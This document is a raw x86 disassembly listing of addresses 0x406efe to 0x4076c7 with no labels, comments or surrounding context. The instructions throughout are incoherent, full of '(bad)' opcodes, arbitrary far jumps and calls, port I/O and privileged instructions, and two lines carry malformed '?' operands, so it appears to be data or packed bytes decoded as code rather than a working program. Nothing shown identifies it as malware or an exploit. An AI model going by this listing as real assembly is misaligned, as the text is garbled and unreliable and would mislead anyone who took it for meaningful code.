  406efe:	jge    0x406f67
  406f00:	arpl   WORD PTR [ebx+0x74],bp
  406f03:	(bad)  
  406f05:	mov    al,BYTE PTR ss:[esi+0xb]
  406f09:	and    al,0x31
  406f0b:	and    al,0xac
  406f0d:	pop    ds
  406f0e:	scas   eax,DWORD PTR es:[edi]
  406f0f:	jp     0x406ec6
  406f11:	sub    bl,bh
  406f13:	jp     0x406f11
  406f15:	mov    ch,0xb4
  406f17:	fisttp WORD PTR [edx]
  406f19:	test   al,0xb2
  406f1b:	dec    edx
  406f1c:	push   edx
  406f1d:	icebp  
  406f1e:	dec    edx
  406f1f:	outs   dx,DWORD PTR ds:[esi]
  406f20:	pop    ds
  406f21:	out    0xd6,al
  406f23:	rcr    ah,cl
  406f25:	dec    esi
  406f26:	out    0x10,al
  406f28:	das    
  406f29:	xlat   BYTE PTR ds:[ebx]
  406f2a:	shl    ch,0xd9
  406f2d:	mul    DWORD PTR [edi]
  406f2f:	stc    
  406f30:	push   ds
  406f31:	dec    eax
  406f32:	and    al,0x80
  406f34:	jae    0x406ef9
  406f36:	mov    edx,0xa84f0e14
  406f3b:	dec    esi
  406f3c:	in     eax,dx
  406f3d:	push   0x536f8ea7
  406f42:	mov    dh,0x3
  406f44:	pop    ebp
  406f45:	in     al,dx
  406f46:	fisttp QWORD PTR [esp+eiz*8]
  406f49:	test   al,0xdb
  406f4b:	stc    
  406f4c:	imul   ebx,DWORD PTR [eax-0x16],0x115246f6
  406f53:	(bad)  
  406f54:	call   FWORD PTR [eax]
  406f56:	inc    ecx
  406f57:	cmc    
  406f58:	add    al,BYTE PTR [ebx+0x73]
  406f5b:	xor    DWORD PTR [eax-0x20],eax
  406f5e:	pop    esp
  406f5f:	add    eax,0xf04b90d2
  406f64:	cmp    al,0xa4
  406f66:	adc    al,BYTE PTR [ebx+0x200f668a]
  406f6c:	(bad)  
  406f6d:	jns    0x406fac
  406f6f:	fild   WORD PTR [eax]
  406f71:	push   ds
  406f72:	jns    0x406eff
  406f74:	and    al,0x8a
  406f76:	and    BYTE PTR ds:0xf187fba0,ch
  406f7c:	pushf  
  406f7d:	and    DWORD PTR [ecx-0x68dcd44f],ebx
  406f83:	adc    al,0x4f
  406f85:	mov    ecx,0x5bee5d06
  406f8a:	mov    DWORD PTR [eax+0x1a],esp
  406f8d:	push   ebp
  406f8e:	ror    BYTE PTR [eax+0x5f26afb4],1
  406f94:	cmp    esp,ecx
  406f96:	retf   
  406f97:	and    al,BYTE PTR [edi*2-0x60f7c5e2]
  406f9e:	mov    al,ds:0xb436d4f4
  406fa3:	jns    0x406fb4
  406fa5:	lods   al,BYTE PTR ds:[esi]
  406fa6:	pop    esi
  406fa7:	pop    ecx
  406fa8:	int3   
  406fa9:	push   0x42
  406fab:	jnp    0x407028
  406fad:	(bad)  
  406faf:	pop    es
  406fb0:	mov    ds:0x6da3ce68,al
  406fb5:	dec    eax
  406fb6:	xor    esi,edi
  406fb8:	in     al,0x14
  406fba:	mov    ch,BYTE PTR [ecx]
  406fbc:	fwait
  406fbd:	mov    ds:0x4c1590e7,eax
  406fc2:	imul   edi,DWORD PTR [edi+0x669cb67a],0x55
  406fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fca:	lds    esp,FWORD PTR [esi]
  406fcc:	test   eax,0x2bd14eca
  406fd1:	push   ebp
  406fd2:	mov    DWORD PTR [eax-0x2d],esp
  406fd5:	cmp    ebx,esi
  406fd7:	test   BYTE PTR ds:0x510e0a42,bl
  406fdd:	xchg   esp,eax
  406fde:	pop    ebp
  406fdf:	adc    DWORD PTR [edx],0xfffffff2
  406fe2:	dec    edx
  406fe3:	retf   0xc6d3
  406fe6:	or     al,0x0
  406fe8:	imul   ebx,edx,0xd9d8d68b
  406fee:	fadd   DWORD PTR [ebp+0x791e3ff5]
  406ff4:	repnz cmp al,0x34
  406ff7:	or     DWORD PTR [edi-0x10e30eda],edi
  406ffd:	jge    0x406fda
  406fff:	jge    0x406f9f
  407001:	jne    0x40702a
  407003:	or     eax,0xf287b3c7
  407008:	cwde   
  407009:	jl     0x406fd2
  40700b:	or     eax,0x805d1688
  407010:	stos   BYTE PTR es:[edi],al
  407011:	pop    ecx
  407012:	jmp    0x3469:0x354bcbb8
  407019:	pop    ebp
  40701a:	add    dl,BYTE PTR [ebx+0x5b]
  40701d:	bnd call 0x8a5b396f
  407023:	or     al,0x14
  407025:	hlt    
  407026:	mov    dl,0xa6
  407028:	sbb    BYTE PTR [ebx-0x117c85b8],bl
  40702e:	xchg   edi,eax
  40702f:	xlat   BYTE PTR ds:[ebx]
  407030:	xchg   esp,eax
  407031:	jb     0x407087
  407033:	add    BYTE PTR [edi+0x1ba70c81],0x8b
  40703a:	sbb    al,0x7a
  40703c:	fdiv   st,st(0)
  40703e:	fiadd  DWORD PTR ds:0xa6a8b6f3
  407044:	rol    ebp,1
  407046:	push   0x78
  407048:	gs cs inc ecx
  40704b:	scas   al,BYTE PTR es:[edi]
  40704c:	inc    ebx
  40704d:	outs   dx,DWORD PTR ds:[esi]
  40704e:	data16 and BYTE PTR ds:0x3928e8c5,bl
  407055:	xchg   BYTE PTR [ecx-0x78ba6df0],dh
  40705b:	outs   dx,DWORD PTR ds:[esi]
  40705c:	push   esp
  40705d:	push   es
  40705e:	(bad)  [edx+ecx*1-0x7a]
  407062:	out    0xe9,eax
  407064:	fnstcw WORD PTR [ecx]
  407066:	add    BYTE PTR [ecx+ebx*8-0x7480fdae],al
  40706d:	or     DWORD PTR ds:0xc548a763,0x1de427e0
  407077:	xor    cl,al
  407079:	out    dx,eax
  40707a:	fisttp QWORD PTR [esp+ecx*8]
  40707d:	cmp    DWORD PTR [ebx-0x3e],ebx
  407080:	or     DWORD PTR [edi-0x46],edx
  407083:	dec    esp
  407084:	repnz push ecx
  407086:	or     eax,0x282887e6
  40708b:	mov    al,ds:0xcd2511db
  407090:	mov    ds:0x5c810560,eax
  407095:	das    
  407096:	bound  ebp,QWORD PTR ds:0x297af065
  40709c:	jl     0x407055
  40709e:	mov    edi,0x40488801
  4070a3:	int    0xc8
  4070a5:	lock mov edx,0xab4cd89c
  4070ab:	jbe    0x407061
  4070ad:	mov    esi,ebx
  4070af:	add    al,0xa0
  4070b1:	inc    esp
  4070b2:	push   edi
  4070b3:	clc    
  4070b4:	push   ecx
  4070b5:	retf   0xa0be
  4070b8:	xor    dh,BYTE PTR [ecx]
  4070ba:	pop    esi
  4070bb:	mov    al,ds:0x87b2060a
  4070c0:	and    DWORD PTR [ebx+0x6d],eax
  4070c3:	dec    ebp
  4070c4:	bound  edi,QWORD PTR [ebx-0x12]
  4070c7:	and    dl,BYTE PTR [ebp-0x1a38b03b]
  4070cd:	sub    ebp,DWORD PTR [edx-0x62]
  4070d0:	not    BYTE PTR cs:[ebx-0x33]
  4070d4:	test   eax,ebp
  4070d6:	push   ds
  4070d7:	xor    edi,DWORD PTR [edi-0x63]
  4070da:	loope  0x407140
  4070dc:	bound  ebx,QWORD PTR ds:0x12acf6f0
  4070e2:	dec    edi
  4070e3:	mov    eax,ds:0x932eec36
  4070e8:	(bad)  
  4070e9:	xor    edx,ebp
  4070eb:	lea    ecx,[esi+0x1988a6f1]
  4070f1:	sub    DWORD PTR [ebp-0x71f3a591],eax
  4070f7:	icebp  
  4070f8:	ret    
  4070f9:	mov    dl,0xf8
  4070fb:	dec    eax
  4070fc:	or     BYTE PTR [eax-0x18b73704],0x14
  407103:	mov    dl,0x88
  407105:	dec    ebx
  407106:	add    eax,0xa6e60853
  40710b:	and    BYTE PTR [edi],cl
  40710d:	and    DWORD PTR [ecx-0x64],edx
  407110:	daa    
  407111:	leave  
  407112:	mov    ch,0x66
  407114:	jo     0x4070d5
  407116:	lods   eax,DWORD PTR ds:[esi]
  407117:	data16 arpl WORD PTR [edi+0x76e973be],si
  40711e:	data16 adc al,0x79
  407121:	hlt    
  407122:	or     al,0xc1
  407124:	add    bl,bh
  407126:	jae    0x407105
  407128:	nop
  407129:	push   ebp
  40712a:	push   es
  40712b:	repz mov esp,0x8a4ac06f
  407131:	fmulp  st(0),st
  407133:	xchg   BYTE PTR [ecx],ch
  407135:	arpl   sp,di
  407137:	fmul   QWORD PTR [ecx]
  407139:	and    BYTE PTR [edx-0x11],bh
  40713c:	jb     0x40712a
  40713e:	jnp    0x4071ba
  407140:	inc    edi
  407141:	scas   al,BYTE PTR es:[edi]
  407142:	xor    bh,BYTE PTR [ebp+0x5b145a4b]
  407148:	push   ecx
  407149:	pushf  
  40714a:	aad    0xc8
  40714c:	dec    ebp
  40714d:	sbb    eax,0xa45c4f8e
  407152:	cmp    dl,BYTE PTR [eax]
  407154:	(bad)  
  407156:	das    
  407157:	outs   dx,BYTE PTR ds:[esi]
  407158:	pop    esi
  407159:	inc    ebp
  40715a:	cmp    DWORD PTR [edi+esi*8],0xbe080ad8
  407161:	das    
  407162:	aas    
  407163:	popf   
  407164:	ret    0x562e
  407167:	outs   dx,DWORD PTR ds:[esi]
  407168:	fild   QWORD PTR [ecx-0x3c4c1956]
  40716e:	pusha  
  40716f:	adc    ah,bl
  407171:	mov    cl,0x2d
  407173:	push   edx
  407174:	rol    dl,1
  407176:	stos   BYTE PTR es:[edi],al
  407177:	pop    ds
  407178:	div    DWORD PTR gs:[eax]
  40717b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40717c:	cmp    bh,BYTE PTR [esi]
  40717e:	lahf   
  40717f:	dec    eax
  407180:	or     BYTE PTR [ecx],0x78
  407183:	test   al,0xbb
  407185:	or     esi,DWORD PTR [ebx]
  407187:	pop    es
  407188:	jnp    0x407202
  40718a:	push   esi
  40718b:	pop    edx
  40718c:	(bad)  
  40718d:	sub    al,0xda
  40718f:	fstp   QWORD PTR [edx]
  407191:	fsubrp st(1),st
  407193:	shr    DWORD PTR [ecx-0x5b29fe36],cl
  407199:	sbb    edx,DWORD PTR [ebx+0x1f]
  40719c:	xor    BYTE PTR [edi-0x2cd6e2db],ah
  4071a2:	jb     0x40714a
  4071a4:	xlat   BYTE PTR ds:[ebx]
  4071a5:	dec    ebp
  4071a6:	data16 stos BYTE PTR es:[edi],al
  4071a8:	jmp    0x1568a6eb
  4071ad:	pushf  
  4071ae:	mov    dl,BYTE PTR [edi-0x6d]
  4071b1:	mov    esp,0xcdc9e200
  4071b6:	mov    esp,0xf6b25cd0
  4071bb:	je     0x40716d
  4071bd:	or     al,0xf3
  4071bf:	hlt    
  4071c0:	cs loop 0x4071d8
  4071c3:	mov    edi,0xc7f98e97
  4071c8:	mov    dh,0x74
  4071ca:	shl    ch,1
  4071cc:	mov    ecx,0xb5e9adfa
  4071d1:	dec    ebx
  4071d2:	aaa    
  4071d3:	not    BYTE PTR [ebx+0x21]
  4071d6:	iret   
  4071d7:	xor    al,0xc
  4071d9:	pop    esp
  4071da:	or     DWORD PTR [ecx+0x5e],edx
  4071dd:	ror    BYTE PTR ds:0x2fd3b584,cl
  4071e3:	adc    esi,DWORD PTR [esi+ebx*2]
  4071e6:	aas    
  4071e7:	dec    edx
  4071e8:	loopne 0x40716e
  4071ea:	sbb    al,0x5a
  4071ec:	push   esp
  4071ed:	cmp    eax,0xe6ae58f2
  4071f2:	mov    ebx,0xeb4e3235
  4071f7:	pop    ebp
  4071f8:	fsubr  st,st(4)
  4071fa:	sbb    ebp,DWORD PTR [esp+ecx*8+0x40]
  4071fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ff:	dec    ebx
  407200:	and    eax,0xaa1242be
  407205:	sub    ch,BYTE PTR [ebx-0x3]
  407208:	rcr    ebp,cl
  40720a:	pop    esi
  40720b:	lods   eax,DWORD PTR ds:[esi]
  40720c:	cmp    BYTE PTR [ebp-0x55],cl
  40720f:	inc    ebp
  407210:	iret   
  407211:	retf   
  407212:	out    dx,al
  407213:	cmp    esp,DWORD PTR [ecx-0x5eb801a4]
  407219:	mov    al,ds:0x64653c56
  40721e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40721f:	adc    al,0x19
  407221:	call   0x8a1ea88b
  407226:	dec    esi
  407227:	or     dl,BYTE PTR [ecx-0x1d5de7b5]
  40722d:	fwait
  40722e:	dec    esp
  40722f:	jg     0x4071bb
  407231:	mov    ebx,DWORD PTR [ebx]
  407233:	out    dx,al
  407234:	adc    ah,BYTE PTR [esi]
  407236:	iret   
  407237:	test   eax,ebp
  407239:	push   ebp
  40723a:	or     BYTE PTR [edx-0x7f],dh
  40723d:	mov    esi,0xa94636b4
  407242:	(bad)  
  407243:	(bad)  
  407244:	pop    eax
  407245:	mov    ch,0xed
  407247:	(bad)  
  407248:	push   edx
  407249:	cmc    
  40724a:	dec    eax
  40724b:	jno    0x407231
  40724d:	and    BYTE PTR [eax-0x148083cb],ch
  407253:	jg     0x40723f
  407255:	dec    si
  407257:	or     BYTE PTR [ebx+ebp*2+0x2d],cl
  40725b:	jge    0x40723c
  40725d:	loopne 0x407289
  40725f:	ret    0x1f43
  407262:	outs   dx,DWORD PTR ds:[esi]
  407263:	les    esp,FWORD PTR [eax+0x4a]
  407266:	jno    0x4072b5
  407268:	add    dh,BYTE PTR [eax-0x4b404fac]
  40726e:	and    ebp,edi
  407270:	mov    ch,ch
  407272:	push   edi
  407273:	sub    DWORD PTR [edx-0x31e9d584],esp
  407279:	leave  
  40727a:	xor    cl,BYTE PTR [ecx+0x48]
  40727d:	popa   
  40727e:	fwait
  40727f:	sbb    ebx,DWORD PTR [ebp-0x1b576cca]
  407285:	out    dx,al
  407286:	sbb    dl,BYTE PTR [ecx]
  407288:	mov    eax,0x6a330771
  40728d:	test   bh,ch
  40728f:	mov    dl,0xb8
  407291:	lahf   
  407292:	mov    eax,ds:0xfbc5884d
  407297:	imul   ecx,DWORD PTR [ecx],0xffffffbf
  40729a:	xchg   ebx,eax
  40729b:	jbe    0x407284
  40729d:	test   al,0x82
  40729f:	fnstsw WORD PTR [edx+0x25aa4569]
  4072a5:	xor    dh,ah
  4072a7:	(bad)  
  4072a8:	les    eax,FWORD PTR [esi+0xb906a6f]
  4072ae:	or     DWORD PTR [esi],edi
  4072b0:	jns    0x40728f
  4072b2:	push   es
  4072b3:	inc    DWORD PTR [ecx+0x6edcd63c]
  4072b9:	aam    0xc3
  4072bb:	add    DWORD PTR [edi+0x2ae02209],eax
  4072c1:	cld    
  4072c2:	out    dx,al
  4072c3:	cmp    al,BYTE PTR [edi]
  4072c5:	xchg   esi,eax
  4072c6:	jl     0x4072f2
  4072c8:	or     ebx,eax
  4072ca:	dec    edi
  4072cb:	int3   
  4072cc:	inc    edx
  4072cd:	inc    esp
  4072ce:	ss stos DWORD PTR es:[edi],eax
  4072d0:	push   edx
  4072d1:	xchg   BYTE PTR [ebx],bl
  4072d3:	bound  eax,QWORD PTR [ecx+0x572e746b]
  4072d9:	iret   
  4072da:	lea    ebp,[esi+0x7a30fb19]
  4072e0:	xchg   esi,eax
  4072e1:	les    esp,FWORD PTR [ecx+0x11]
  4072e4:	jbe    0x40729c
  4072e6:	push   cs
  4072e7:	add    DWORD PTR [ebx],ecx
  4072e9:	pop    eax
  4072ea:	das    
  4072eb:	(bad)  
  4072ed:	test   al,0x53
  4072ef:	sub    eax,0xc47bd9ec
  4072f4:	sbb    al,0xa3
  4072f6:	and    BYTE PTR [ebx-0x36484edc],cl
  4072fc:	mov    ecx,0x2b4c869c
  407301:	lea    esp,[edi]
  407303:	mov    ds:0x54dd29ca,eax
  407308:	inc    edi
  407309:	push   edi
  40730a:	cwde   
  40730b:	(bad)  
  40730d:	fidiv  DWORD PTR [edi+esi*8-0x78ff0b77]
  407314:	(bad)  
  407315:	(bad)  
  407317:	adc    DWORD PTR [edi],ebp
  407319:	and    cl,BYTE PTR [eax-0x68]
  40731c:	push   cs
  40731d:	fs push ebx
  40731f:	arpl   WORD PTR [eax-0x254bd329],bx
  407325:	mov    al,0x8b
  407327:	int3   
  407328:	adc    BYTE PTR [esp+ecx*2-0x6a7aba5a],dh
  40732f:	pop    ebx
  407330:	and    al,0xad
  407332:	xlat   BYTE PTR ds:[ebx]
  407333:	dec    ecx
  407334:	aad    0x56
  407336:	enter  0xa915,0x7e
  40733a:	ja     0x407349
  40733c:	dec    esp
  40733e:	dec    eax
  40733f:	imul   ecx,edi,0xffffffd0
  407342:	lods   eax,DWORD PTR ds:[esi]
  407343:	daa    
  407344:	sbb    ebp,ecx
  407346:	pop    edi
  407347:	sbb    eax,0xa716ace4
  40734c:	push   cs
  40734d:	loope  0x4072e7
  40734f:	jg     0x407332
  407351:	(bad)  
  407352:	xor    eax,0x60dc692b
  407357:	pop    edi
  407358:	ins    BYTE PTR es:[edi],dx
  407359:	ret    
  40735a:	sbb    BYTE PTR [eax+0xb698b1c],0xf3
  407361:	mov    cl,0x5a
  407363:	int3   
  407364:	push   edi
  407365:	push   eax
  407366:	sub    eax,0x72f7c4ae
  40736b:	fsubr  DWORD PTR [eax+0x45]
  40736e:	es pop edi
  407370:	xor    ah,ch
  407372:	fcomp  QWORD PTR [eax]
  407374:	fst    QWORD PTR [ebp-0x51]
  407377:	add    ch,BYTE PTR cs:[ecx]
  40737a:	outs   dx,BYTE PTR ds:[esi]
  40737b:	push   ss
  40737c:	pop    es
  40737d:	add    eax,0x6fd96599
  407382:	shr    BYTE PTR [ecx-0x14],1
  407385:	je     0x40739d
  407387:	or     ah,BYTE PTR [ebx-0x27]
  40738a:	cmp    BYTE PTR [esi-0x37],0xdf
  40738e:	std    
  40738f:	sub    cl,BYTE PTR [ebp-0x5aea46ee]
  407395:	loopne 0x407402
  407397:	jle    0x407391
  407399:	mov    ch,0x2b
  40739b:	sub    eax,0xd9fa0bbc
  4073a0:	lods   al,BYTE PTR ds:[esi]
  4073a1:	jmp    0x4073d5
  4073a3:	add    edx,DWORD PTR [ecx+0x2c]
  4073a6:	xlat   BYTE PTR ds:[ebx]
  4073a7:	fist   DWORD PTR [ecx+edi*8+0x3d4582ac]
  4073ae:	bound  esp,QWORD PTR [eax-0x5c6ca861]
  4073b4:	jne    0x4073ae
  4073b6:	fisttp WORD PTR ds:0xd4757a49
  4073bc:	bound  esi,QWORD PTR [edx]
  4073be:	cmp    al,0xdd
  4073c0:	or     BYTE PTR [ebp-0x9bafea1],0x99
  4073c7:	jns    0x4073f2
  4073c9:	stos   BYTE PTR es:[edi],al
  4073ca:	cmc    
  4073cb:	jecxz  0x4073b9
  4073cd:	xchg   edx,eax
  4073ce:	jge    0x4073f1
  4073d0:	ins    DWORD PTR es:[edi],dx
  4073d1:	nop
  4073d2:	mov    edi,0xcbe47d87
  4073d7:	test   BYTE PTR [ecx+0x7b2abe34],dh
  4073dd:	out    dx,eax
  4073de:	jbe    0x407399
  4073e0:	dec    BYTE PTR ds:0x9dd5b1d3
  4073e6:	cwde   
  4073e7:	lock xlat BYTE PTR ds:[ebx]
  4073e9:	(bad)  
  4073ea:	outs   dx,DWORD PTR ds:[esi]
  4073eb:	loopne 0x40740f
  4073ed:	hlt    
  4073ee:	stos   BYTE PTR es:[edi],al
  4073ef:	adc    DWORD PTR [esi],edi
  4073f1:	mov    eax,ds:0xdff5a77d
  4073f6:	cwde   
  4073f7:	pop    esp
  4073f8:	jmp    0x40745c
  4073fa:	add    ebx,esi
  4073fc:	and    eax,0x998155c7
  407401:	mov    bl,0xaa
  407403:	mov    cl,0xb8
  407405:	xchg   edx,eax
  407406:	xchg   BYTE PTR [ebp-0x3a],al
  407409:	or     al,0xca
  40740b:	fwait
  40740c:	test   al,0x50
  40740e:	repz inc ebx
  407410:	push   ecx
  407411:	fstp   QWORD PTR [edx]
  407413:	mov    al,ds:0x97f0a4bf
  407418:	jae    0x4073b8
  40741a:	mov    WORD PTR [esi-0x4c],?
  40741d:	inc    ecx
  40741e:	aaa    
  40741f:	pop    edi
  407420:	mov    edi,0xa58b08bd
  407425:	test   eax,0xbb2e2bf6
  40742a:	cld    
  40742b:	dec    esi
  40742c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40742d:	jo     0x40740a
  40742f:	sahf   
  407430:	mov    ebx,0xaf1a35c3
  407435:	out    dx,eax
  407436:	add    DWORD PTR gs:[ebx],eax
  407439:	fldcw  WORD PTR [edx-0x756e553]
  40743f:	into   
  407440:	stos   DWORD PTR es:[edi],eax
  407441:	cs loop 0x407455
  407444:	push   ecx
  407445:	pusha  
  407446:	out    0xcc,eax
  407448:	jno    0x4073ea
  40744a:	int    0x7
  40744c:	daa    
  40744d:	out    dx,al
  40744e:	adc    al,0xb5
  407450:	xor    DWORD PTR [edi+0x6d],eax
  407453:	jle    0x407449
  407455:	stc    
  407456:	in     eax,0x1d
  407458:	(bad)  
  407459:	in     al,dx
  40745a:	inc    esi
  40745b:	dec    edi
  40745c:	sar    DWORD PTR [edx+0x1f4cea56],1
  407462:	xor    dh,BYTE PTR [esi+0x6c03a53d]
  407468:	(bad)  
  407469:	out    dx,eax
  40746a:	call   0xc2f7:0x41245fd3
  407471:	mov    ebx,0xb512e2c8
  407476:	lods   eax,DWORD PTR ds:[esi]
  407477:	imul   ebp,DWORD PTR [esi],0x702c007a
  40747d:	push   ss
  40747e:	call   0x9eeb:0x9c327446
  407485:	and    BYTE PTR ss:[eax+ebp*8-0x1a],0xcb
  40748b:	jne    0x40742d
  40748d:	icebp  
  40748e:	lock sar DWORD PTR [eax-0xd],cl
  407492:	dec    ebx
  407493:	fwait
  407494:	xchg   esp,eax
  407495:	jecxz  0x407457
  407497:	sub    BYTE PTR [eax],dl
  407499:	test   BYTE PTR [edi-0xe],ch
  40749c:	mov    bl,0xd3
  40749e:	jge    0x4074d2
  4074a0:	out    0xd0,eax
  4074a2:	scas   al,BYTE PTR es:[edi]
  4074a3:	jb     0x4074ff
  4074a5:	add    al,0x8e
  4074a7:	cwde   
  4074a8:	test   DWORD PTR [eax+0x8c55362],esi
  4074ae:	rcr    BYTE PTR [edx-0x5b],0xc6
  4074b2:	sbb    edi,DWORD PTR [eax+0x543bf210]
  4074b8:	mov    BYTE PTR ds:0x67b5e5ad,ah
  4074be:	pop    ss
  4074bf:	(bad)  
  4074c0:	fild   QWORD PTR [edi+0x54]
  4074c3:	or     ebp,edi
  4074c5:	pop    ecx
  4074c6:	add    DWORD PTR [ecx+0x15],ebp
  4074c9:	data16 adc BYTE PTR [ebp+0x25e1ccb3],dl
  4074d0:	xchg   ecx,eax
  4074d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d2:	jp     0x40752c
  4074d4:	xor    eax,0xd1fcef7d
  4074d9:	imul   sp,ax,0xfffa
  4074dd:	out    0xdb,al
  4074df:	repz adc bh,BYTE PTR [ecx-0x9]
  4074e3:	div    BYTE PTR [esp+eax*1-0x1d]
  4074e7:	pop    es
  4074e8:	mov    edx,0x88b2ed0b
  4074ed:	into   
  4074ee:	call   0x2574c6e0
  4074f3:	sbb    BYTE PTR [ecx-0x58],dh
  4074f6:	mov    dl,0xa4
  4074f8:	xchg   esi,eax
  4074f9:	clc    
  4074fa:	mov    ebx,0xd189f1a1
  4074ff:	loopne 0x407539
  407501:	jecxz  0x40753a
  407503:	ja     0x4074fb
  407505:	sti    
  407506:	dec    ebp
  407507:	fnstcw WORD PTR ss:[edi-0x71]
  40750b:	xchg   BYTE PTR [edx+0x78],cl
  40750e:	out    0xe3,al
  407510:	test   eax,0x44c2641e
  407515:	fisttp DWORD PTR [edx-0x1c56a34a]
  40751b:	lds    edx,FWORD PTR [ebx-0x12a18471]
  407521:	sub    bh,BYTE PTR [eax-0x6f]
  407524:	cld    
  407525:	sbb    ecx,edi
  407527:	(bad)  
  407528:	fwait
  407529:	push   esi
  40752a:	ja     0x407512
  40752c:	push   esp
  40752d:	ret    
  40752e:	jp     0x40758d
  407530:	(bad)  
  407531:	and    eax,0x1285dbe5
  407536:	ja     0x407518
  407538:	push   ss
  407539:	ds in  eax,dx
  40753b:	push   0x51
  40753d:	mov    eax,?
  40753f:	mov    ds:0x2a48107e,al
  407544:	adc    DWORD PTR [eax+edx*8],esp
  407547:	jae    0x4074e6
  407549:	call   0xd6664143
  40754e:	sbb    esi,eax
  407550:	aas    
  407551:	push   0xd4c3a3b5
  407556:	and    bl,BYTE PTR ss:[edi]
  407559:	and    BYTE PTR ds:0x9c117f78,ah
  40755f:	or     ebp,esi
  407561:	pop    ss
  407562:	push   es
  407563:	mov    eax,0x7f765f56
  407568:	jmp    0xeea3:0xe19f0741
  40756f:	mov    eax,0xd512c99e
  407574:	jmp    0x40756c
  407576:	xor    edx,0xc161c60e
  40757c:	jmp    0x407509
  40757e:	adc    eax,0x821d58eb
  407583:	xchg   ecx,eax
  407584:	or     eax,0x66e9119e
  407589:	outs   dx,BYTE PTR ds:[esi]
  40758a:	or     ecx,DWORD PTR [edi-0x1fbb24f4]
  407590:	or     cl,dh
  407592:	cmp    BYTE PTR [ebx-0xcb8438d],bh
  407598:	pop    edx
  407599:	mov    dl,0x88
  40759b:	inc    esi
  40759c:	dec    edx
  40759d:	je     0x407558
  40759f:	pop    ss
  4075a0:	(bad)  
  4075a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075a2:	pop    ebp
  4075a3:	rcl    ebp,cl
  4075a5:	adc    dh,ch
  4075a7:	ror    DWORD PTR [ebx+0x3f],1
  4075aa:	xor    bl,ch
  4075ac:	dec    esi
  4075ad:	jmp    FWORD PTR ds:0x58c19d26
  4075b3:	mov    bl,al
  4075b5:	xor    DWORD PTR [ecx-0xb],ebx
  4075b8:	int3   
  4075b9:	push   ecx
  4075ba:	xchg   esi,eax
  4075bb:	or     ecx,eax
  4075bd:	dec    edi
  4075be:	pop    edx
  4075bf:	imul   ebx,DWORD PTR [ebx+ebx*8+0x31a694d],0xffffffaa
  4075c7:	fcomp  DWORD PTR [ecx]
  4075c9:	outs   dx,DWORD PTR ds:[esi]
  4075ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075cc:	mov    ah,0xab
  4075ce:	cmp    eax,0x4a64097f
  4075d3:	push   edx
  4075d4:	dec    edx
  4075d5:	and    esi,eax
  4075d7:	xchg   esi,eax
  4075d8:	pushf  
  4075d9:	out    dx,al
  4075da:	cmp    eax,0x42b8813
  4075df:	dec    edx
  4075e0:	cs test edi,edi
  4075e3:	push   eax
  4075e4:	sar    BYTE PTR es:[ecx],1
  4075e7:	jp     0x4075f6
  4075e9:	mov    cl,0xd4
  4075eb:	test   al,0xf2
  4075ed:	out    dx,eax
  4075ee:	sub    eax,0x63bf57fd
  4075f3:	inc    esp
  4075f4:	rol    ah,0x32
  4075f7:	mov    ds:0x1544c510,eax
  4075fc:	dec    esp
  4075fd:	cmp    edi,ecx
  4075ff:	aam    0xc4
  407601:	adc    eax,0xaef74d18
  407606:	mov    ebx,DWORD PTR [ecx+ebp*1-0x70]
  40760a:	je     0x40760c
  40760c:	add    eax,0x33e4e5d6
  407611:	or     ebx,DWORD PTR [edi]
  407613:	es stos BYTE PTR es:[edi],al
  407615:	iret   
  407616:	pop    ecx
  407617:	or     al,0x85
  407619:	stos   DWORD PTR es:[edi],eax
  40761a:	ins    BYTE PTR es:[edi],dx
  40761b:	hlt    
  40761c:	fst    QWORD PTR [eax+0x4e]
  40761f:	xchg   dl,bl
  407621:	dec    eax
  407622:	pusha  
  407623:	data16 test BYTE PTR [ebp+0x1d],al
  407627:	fild   WORD PTR [ebx+0x5cc4bb5b]
  40762d:	mov    DWORD PTR [edx+esi*4+0x7f],edi
  407631:	xchg   esp,eax
  407632:	jne    0x40761f
  407634:	mov    ch,0xa6
  407636:	pop    edx
  407637:	leave  
  407638:	mov    ebp,0xd8a6e954
  40763d:	dec    edi
  40763e:	in     al,0xbe
  407640:	call   0x7927:0x6b0117db
  407647:	lds    ecx,FWORD PTR [edi-0x3d]
  40764a:	mov    eax,0x9fc85001
  40764f:	in     eax,dx
  407650:	sbb    DWORD PTR [ecx+0x77],ebx
  407653:	inc    ecx
  407654:	cmp    dh,bh
  407656:	icebp  
  407657:	sub    edx,edx
  407659:	sub    ah,BYTE PTR [ecx+eiz*4]
  40765c:	push   eax
  40765d:	jecxz  0x407667
  40765f:	aas    
  407660:	push   esp
  407661:	mov    edx,0x67834cdf
  407666:	or     eax,ecx
  407668:	sub    ebx,edi
  40766a:	enter  0x1e4f,0x56
  40766e:	or     eax,0xb9678173
  407673:	in     eax,dx
  407674:	outs   dx,DWORD PTR ds:[esi]
  407675:	pop    edi
  407676:	call   0xef2b:0x41645958
  40767d:	mov    esp,fs
  40767f:	ds inc edi
  407681:	mov    bh,0x8b
  407683:	imul   BYTE PTR [ecx]
  407685:	(bad)  
  407686:	jmp    0x6003f715
  40768b:	sub    DWORD PTR [ebx+edi*1+0x46],esi
  40768f:	push   ss
  407690:	clc    
  407691:	fs icebp 
  407693:	cmp    eax,0xa001ce9f
  407698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407699:	xchg   esp,eax
  40769a:	jne    0x40770d
  40769c:	repz inc esp
  40769e:	add    eax,0x698fab05
  4076a3:	jmp    0x2efb:0x35675f10
  4076aa:	sbb    ecx,DWORD PTR ds:0xad2b2720
  4076b0:	mov    ds:0x3ad1bd30,eax
  4076b5:	mov    ch,0x11
  4076b7:	push   edx
  4076b8:	fnstcw WORD PTR [eax-0x78]
  4076bb:	stc    
  4076bc:	mov    dl,0xc6
  4076be:	dec    ebp
  4076bf:	xchg   BYTE PTR [ebx+0x2a],dl
  4076c2:	adc    ecx,DWORD PTR [ebx]
  4076c4:	ins    BYTE PTR es:[edi],dx
  4076c5:	outs   dx,DWORD PTR ds:[esi]
  4076c6:	pop    esp
  4076c7:	idiv   esi
